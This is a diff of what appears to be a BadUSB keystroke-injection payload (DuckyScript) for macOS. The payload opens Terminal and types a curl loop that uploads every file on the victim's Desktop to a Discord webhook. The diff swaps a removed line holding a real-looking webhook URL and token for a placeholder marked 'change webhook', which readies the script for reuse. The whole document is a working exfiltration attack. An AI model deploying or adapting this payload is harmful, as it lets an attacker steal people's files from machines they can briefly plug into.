@@ -22,7 +22,8 @@ STRING TERMINAL
 DELAY 250
 ENTER
 DELAY 5000
-STRING echo for file in /Users/$(whoami)/Desktop/*; do curl -X POST -H "Content-Type: multipart/form-data" -F "file=@\"$file\"" https://discord.com/api/webhooks/1296512673327878145/0h0RYRZEzKa3mIOsSYOJFLbRcxs5KUBhxP1oBbWdbKqbPgzKvENd8yKmyxALnTnpylOL; done |pbcopy
+REM change webhook
+STRING echo for file in /Users/$(whoami)/Desktop/*; do curl -X POST -H "Content-Type: multipart/form-data" -F "file=@\"$file\"" webhook; done |pbcopy
 DELAY 850
 ENTER
 DELAY 250
